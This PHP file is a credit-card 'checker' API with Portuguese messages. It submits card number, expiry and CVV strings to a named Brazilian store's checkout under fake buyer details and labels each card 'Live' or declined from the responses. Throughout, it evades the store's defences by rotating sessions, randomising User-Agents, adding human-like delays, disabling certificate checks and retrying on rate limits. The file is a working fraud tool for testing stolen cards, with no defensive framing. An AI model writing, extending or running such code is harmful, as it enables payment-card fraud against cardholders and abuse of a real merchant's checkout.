<?php

require __DIR__ . '/../vendor/autoload.php';

use GuzzleHttp\Client;
use GuzzleHttp\Cookie\CookieJar as GuzzleCookieJar;

// Classe para gerenciar múltiplas sessões e evitar rate limit
class SessionManager {
    private $sessions = [];
    private $currentIndex = 0;
    private $maxSessions = 5;
    private $requestCount = [];
    
    public function __construct() {
        for ($i = 0; $i < $this->maxSessions; $i++) {
            $this->sessions[$i] = new CurlX(new CookieJar("session_$i"));
            $this->requestCount[$i] = 0;
        }
    }
    
    public function getClient() {
        // Rotaciona entre as sessões para evitar rate limit
        $client = $this->sessions[$this->currentIndex];
        $this->requestCount[$this->currentIndex]++;
        
        // Se uma sessão fez muitas requisições, muda para próxima
        if ($this->requestCount[$this->currentIndex] > 10) {
            $this->currentIndex = ($this->currentIndex + 1) % $this->maxSessions;
            // Reset da sessão que teve muitas requisições
            $oldIndex = ($this->currentIndex - 1 + $this->maxSessions) % $this->maxSessions;
            $this->sessions[$oldIndex] = new CurlX(new CookieJar("session_$oldIndex"));
            $this->requestCount[$oldIndex] = 0;
        }
        
        return $client;
    }
    
    public function rotateSession() {
        $this->currentIndex = ($this->currentIndex + 1) % $this->maxSessions;
    }
}

// Enhanced CurlX class
class CurlX {
    private $client;
    private $cookieJar;

    public function __construct(CookieJar $cookieJar) {
        $this->cookieJar = $cookieJar;
        
        // Randomize User-Agent to avoid detection
        $userAgents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        ];
        
        $this->client = new Client([
            'cookies' => $this->cookieJar,
            'allow_redirects' => true,
            'timeout' => 30,
            'verify' => false,
            'decode_content' => true,
            'http_errors' => false,
            'headers' => [
                'User-Agent' => $userAgents[array_rand($userAgents)],
                'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'Accept-Language' => 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
                'Accept-Encoding' => 'gzip, deflate',
                'DNT' => '1',
                'Connection' => 'keep-alive',
                'Upgrade-Insecure-Requests' => '1'
            ]
        ]);
    }

    public function get($url, $params = [], $headers = []) {
        try {
            // Add random delay to appear more human-like
            usleep(rand(2000000, 4000000)); // 2-4 seconds (mais lento)
            
            $response = $this->client->get($url, [
                'query' => $params, 
                'headers' => array_merge([
                    'Referer' => 'https://amazonicocare.com.br/',
                    'Cache-Control' => 'no-cache'
                ], $headers),
                'curl' => [
                    CURLOPT_ENCODING => '', // Let curl handle encoding automatically
                ]
            ]);
            return new CurlXResponse($response);
        } catch (\Exception $e) {
            return new CurlXResponse(null, $e->getMessage());
        }
    }

    public function post($url, $body = '', $headers = []) {
        try {
            // Add random delay
            usleep(rand(3000000, 6000000)); // 3-6 seconds for POST requests (bem mais lento)
            
            $defaultHeaders = [
                'Referer' => 'https://amazonicocare.com.br/',
                'Origin' => 'https://amazonicocare.com.br',
                'Cache-Control' => 'no-cache'
            ];
            
            $options = [
                'headers' => array_merge($defaultHeaders, $headers),
                'curl' => [
                    CURLOPT_ENCODING => '', // Let curl handle encoding automatically
                ]
            ];
            
            if (is_array($body)) {
                $options['form_params'] = $body;
            } else {
                $options['body'] = $body;
            }
            
            $response = $this->client->post($url, $options);
            return new CurlXResponse($response);
        } catch (\Exception $e) {
            return new CurlXResponse(null, $e->getMessage(), $e->getCode());
        }
    }
}

class CurlXResponse {
    public $body;
    public $headers;
    public $error;
    public $statusCode;
    private $guzzleResponse;

    public function __construct($guzzleResponse = null, $error = null, $statusCode = null) {
        $this->guzzleResponse = $guzzleResponse;
        $this->error = $error;
        $this->statusCode = $statusCode;
        
        if ($guzzleResponse) {
            $this->body = (string) $guzzleResponse->getBody();
            $this->headers = $guzzleResponse->getHeaders();
            $this->statusCode = $guzzleResponse->getStatusCode();
        } else {
            $this->body = '';
            $this->headers = [];
        }
    }

    public function between($start, $end) {
        $startPos = strpos($this->body, $start);
        if ($startPos === false) return '';
        $startPos += strlen($start);
        $endPos = strpos($this->body, $end, $startPos);
        if ($endPos === false) return '';
        return substr($this->body, $startPos, $endPos - $startPos);
    }

    public function json() {
        return json_decode($this->body, true);
    }

    public function getHeaders() {
        return $this->headers;
    }
    
    public function isRateLimited() {
        return $this->statusCode === 429 || 
               strpos($this->body, 'Too Many Requests') !== false ||
               strpos($this->body, 'Rate limit') !== false;
    }
}

class CookieJar extends GuzzleCookieJar {
    public function __construct($name) {
        parent::__construct();
    }

    public function delete() {
        // Clear cookies for new session
        $this->clear();
    }
}

// Utility functions
function parseCard($lista) {
    $parts = explode('|', $lista);
    if (count($parts) < 4) {
        return false;
    }
    return [
        'cc' => trim($parts[0]),
        'mes' => str_pad(trim($parts[1]), 2, '0', STR_PAD_LEFT),
        'ano' => trim($parts[2]),
        'ano2' => substr(trim($parts[2]), -2),
        'cvv' => trim($parts[3]),
        'full' => $lista
    ];
}

function detectCardBrand($number) {
    $number = preg_replace('/\D/', '', $number);
    $patterns = [
        'visa' => '/^4[0-9]{12}(?:[0-9]{3})?$/',
        'mastercard' => '/^5[1-5][0-9]{14}$|^2(?:2(?:2[1-9]|[3-9][0-9])|[3-6][0-9][0-9]|7(?:[01][0-9]|20))[0-9]{12}$/',
        'amex' => '/^3[47][0-9]{13}$/',
        'discover' => '/^6(?:011|5[0-9]{2})[0-9]{12}$/',
        'diners' => '/^3(?:0[0-5]|[68][0-9])[0-9]{11}$/',
        'jcb' => '/^(?:2131|1800|35\d{3})\d{11}$/',
        'elo' => '/^((((636368)|(438935)|(504175)|(451416)|(636297))\d{0,10})|((5067)|(4576)|(4011))\d{0,12})$/',
        'hipercard' => '/^(606282\d{10}(\d{3})?)|(3841\d{15})$/',
        'aura' => '/^50[0-9]{14,17}$/'
    ];
    
    foreach ($patterns as $brand => $pattern) {
        if (preg_match($pattern, $number)) {
            return strtoupper($brand);
        }
    }
    return 'UNKNOWN';
}

function detectBankFromBin($bin) {
    $banks = [
        '4011' => 'ITAU', '4012' => 'ITAU', '4013' => 'ITAU', '4014' => 'ITAU',
        '4515' => 'ITAU', '4516' => 'ITAU', '4517' => 'ITAU', '4518' => 'ITAU',
        '4551' => 'BRADESCO', '4902' => 'BRADESCO', '4903' => 'BRADESCO',
        '5555' => 'BRADESCO', '5556' => 'BRADESCO',
        '5448' => 'SANTANDER', '5449' => 'SANTANDER', '4001' => 'SANTANDER', '4002' => 'SANTANDER',
        '4389' => 'BANCO_DO_BRASIL', '4390' => 'BANCO_DO_BRASIL',
        '5067' => 'BANCO_DO_BRASIL', '5068' => 'BANCO_DO_BRASIL',
        '4514' => 'CAIXA', '5501' => 'CAIXA', '5502' => 'CAIXA',
        '5162' => 'NUBANK', '5163' => 'NUBANK',
        '5122' => 'SICREDI', '5123' => 'SICREDI'
    ];
    
    $bin4 = substr($bin, 0, 4);
    return $banks[$bin4] ?? 'UNKNOWN';
}

// Main checker function
function checkCard($card, $sessionManager, $maxRetries = 3) {
    $retryCount = 0;
    
    while ($retryCount < $maxRetries) {
        $client = $sessionManager->getClient();
        
        try {
            // Step 1: Get checkout page and form data
            $checkoutUrl = 'https://amazonicocare.com.br/products/cronograma-de-mascaras-amazonico-care';
            $response = $client->get($checkoutUrl);
            
            if ($response->error) {
                throw new Exception("Erro ao acessar checkout: " . $response->error);
            }
            
            // Check for rate limiting
            if ($response->isRateLimited()) {
                $sessionManager->rotateSession();
                sleep(rand(5, 10)); // Wait before retry
                $retryCount++;
                continue;
            }
            
            // Extract necessary form data (CSRF tokens, etc.)
            $csrfToken = $response->between('name="authenticity_token" value="', '"');
            $formToken = $response->between('name="form_token" value="', '"');
            
            // Step 2: Submit payment data
            $paymentData = [
                'authenticity_token' => $csrfToken,
                'form_token' => $formToken,
                'checkout[email]' => 'test@gmail.com',
                'checkout[shipping_address][first_name]' => 'João',
                'checkout[shipping_address][last_name]' => 'Silva',
                'checkout[shipping_address][company]' => '',
                'checkout[shipping_address][address1]' => 'Rua Teste, 123',
                'checkout[shipping_address][address2]' => '',
                'checkout[shipping_address][city]' => 'São Paulo',
                'checkout[shipping_address][country]' => 'BR',
                'checkout[shipping_address][province]' => 'SP',
                'checkout[shipping_address][zip]' => '01234567',
                'checkout[shipping_address][phone]' => '11999999999',
                'checkout[attributes][document_number]' => '12345678901',
                'checkout[payment_gateway]' => 'credit_card',
                'checkout[credit_card][number]' => $card['cc'],
                'checkout[credit_card][name]' => 'JOÃO SILVA',
                'checkout[credit_card][month]' => $card['mes'],
                'checkout[credit_card][year]' => '20' . $card['ano2'],
                'checkout[credit_card][verification_value]' => $card['cvv']
            ];
            
            $paymentResponse = $client->post($checkoutUrl, $paymentData);
            
            if ($paymentResponse->error && !$paymentResponse->statusCode) {
                throw new Exception("Erro na requisição: " . $paymentResponse->error);
            }
            
            // Analyze response
            return analyzeResponse($paymentResponse, $card);
            
        } catch (Exception $e) {
            $retryCount++;
            if ($retryCount >= $maxRetries) {
                return [
                    'status' => 'error',
                    'message' => 'Max retries reached: ' . $e->getMessage(),
                    'brand' => detectCardBrand($card['cc']),
                    'bank' => detectBankFromBin($card['cc'])
                ];
            }
            
            // Rotate session on error
            $sessionManager->rotateSession();
            sleep(rand(5, 10)); // Delay maior entre tentativas
        }
    }
}

function analyzeResponse($response, $card) {
    $body = strtolower($response->body);
    $statusCode = $response->statusCode;
    
    $detected_brand = detectCardBrand($card['cc']);
    $detected_bank = detectBankFromBin($card['cc']);
    
    // Rate limit detection
    if ($response->isRateLimited()) {
        return [
            'status' => 'rate_limited',
            'message' => 'Rate limit atingido - erro 429',
            'brand' => $detected_brand,
            'bank' => $detected_bank
        ];
    }
    
    // Card invalid patterns
    $invalidPatterns = [
        'cartão inválido',
        'cartao invalido', 
        'invalid card',
        'número do cartão inválido',
        'card number is invalid',
        'dados do cartão incorretos',
        'cartão não aceito'
    ];
    
    foreach ($invalidPatterns as $pattern) {
        if (strpos($body, $pattern) !== false) {
            return [
                'status' => 'declined',
                'message' => 'Cartão Inválido ❌',
                'brand' => $detected_brand,
                'bank' => $detected_bank
            ];
        }
    }
    
    // HTTP 400 usually means card is valid but payment failed (LIVE)
    if ($statusCode === 400) {
        return [
            'status' => 'approved',
            'message' => 'Live Card ✅ - Erro 400 (Processou)',
            'brand' => $detected_brand,
            'bank' => $detected_bank
        ];
    }
    
    // Success patterns (very rare but possible)
    $successPatterns = [
        'pagamento aprovado',
        'transação aprovada',
        'payment approved',
        'success',
        'obrigado pela compra'
    ];
    
    foreach ($successPatterns as $pattern) {
        if (strpos($body, $pattern) !== false) {
            return [
                'status' => 'approved',
                'message' => 'Live Card ✅ - Transação Aprovada',
                'brand' => $detected_brand,
                'bank' => $detected_bank
            ];
        }
    }
    
    // Payment processing errors (usually indicates LIVE card)
    $livePatterns = [
        'erro no processamento',
        'payment processing error',
        'erro interno',
        'internal error',
        'gateway error',
        'erro no gateway'
    ];
    
    foreach ($livePatterns as $pattern) {
        if (strpos($body, $pattern) !== false) {
            return [
                'status' => 'approved',
                'message' => 'Live Card ✅ - Erro de Processamento',
                'brand' => $detected_brand,
                'bank' => $detected_bank
            ];
        }
    }
    
    // Default case - unknown response  
    $truncatedBody = substr($body, 0, 200);
    return [
        'status' => 'unknown',
        'message' => 'Resposta desconhecida - Status: ' . $statusCode . ' | Body: ' . $truncatedBody,
        'brand' => $detected_brand,
        'bank' => $detected_bank
    ];
}

// Main API Logic
header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['status' => 'error', 'message' => 'Método não permitido.']);
    exit;
}

$input = json_decode(file_get_contents('php://input'), true);
$lista = $input['lista'] ?? null;

if (!$lista) {
    http_response_code(400);
    echo json_encode(['status' => 'error', 'message' => 'Parâmetro "lista" ausente ou inválido.']);
    exit;
}

$time_start = microtime(true);

$card = parseCard($lista);
if (!$card) {
    echo json_encode([
        'status' => 'declined', 
        'message' => 'Lista inválida!', 
        'brand' => 'UNKNOWN', 
        'bank' => 'UNKNOWN', 
        'time' => (microtime(true) - $time_start) . 's'
    ]);
    exit;
}

// Initialize session manager
$sessionManager = new SessionManager();

// Check the card
$result = checkCard($card, $sessionManager);
$result['time'] = (microtime(true) - $time_start) . 's';

echo json_encode($result);

?>